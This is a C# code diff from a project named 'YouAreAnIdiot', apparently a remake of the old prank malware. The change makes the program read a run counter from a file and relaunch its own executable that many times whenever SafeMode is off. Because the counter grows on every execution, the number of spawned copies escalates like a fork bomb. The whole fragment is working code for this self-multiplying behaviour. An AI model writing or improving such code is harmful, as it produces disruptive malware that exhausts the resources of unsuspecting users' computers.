@@ -32,7 +32,8 @@ namespace YouAreAnIdiot
         {
             if (!SafeMode)
             {
-                for (int j = 0; j < i; j++)
+                int openTimes = ReturnExecutions();
+                for (int j = 0; j < openTimes; j++)
                 {
                     Process.Start(Application.ExecutablePath);
                 }
@@ -41,14 +42,22 @@ namespace YouAreAnIdiot
         }
         private static void ExecutionsLogic()
         {
-            if (File.Exists(Path))
-            {
-                string text = File.ReadAllText(Path);
-                int.TryParse(text, out i);
-            }
+            i = ReturnExecutions();
             i++;
             File.WriteAllText(Path, i.ToString()); // write i value for the next execution
         }
+
+        private static int ReturnExecutions()
+        {
+            int times = 0;
+            if (File.Exists(Path))
+            {
+                string text = File.ReadAllText(Path);
+                int.TryParse(text, out times);
+            }
+            return times;
+        }
+
         public static void PlaySound()
         {
             Assembly assembly = Assembly.GetExecutingAssembly();
